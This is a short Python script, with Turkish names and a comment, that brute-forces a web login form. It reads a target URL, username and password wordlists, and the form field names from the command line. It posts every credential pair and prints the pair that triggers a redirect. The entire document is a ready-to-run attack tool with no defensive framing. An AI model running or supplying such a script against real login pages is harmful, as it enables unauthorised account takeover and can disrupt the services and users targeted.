import requests  # type: ignore
import sys

def saldır():
    for username in username_list:
        for password in password_list:
            payload = {
                iusurname: username.strip(),
                ipassword: password.strip()
            }
        
            response = requests.post(url, data=payload, allow_redirects=True)
        
            if response.history:
                print(f"Connected! Username: {username.strip()} Password: {password.strip()}")
                return  # Başarı bulunduğunda döngüden çık
    
if __name__ == "__main__":
    url = sys.argv[1]
    
    with open(sys.argv[2], "r") as file:
        username_list = file.readlines()
    
    with open(sys.argv[3], "r") as file:
        password_list = file.readlines()
    
    iusurname = sys.argv[4]
    ipassword = sys.argv[5]

    saldır()

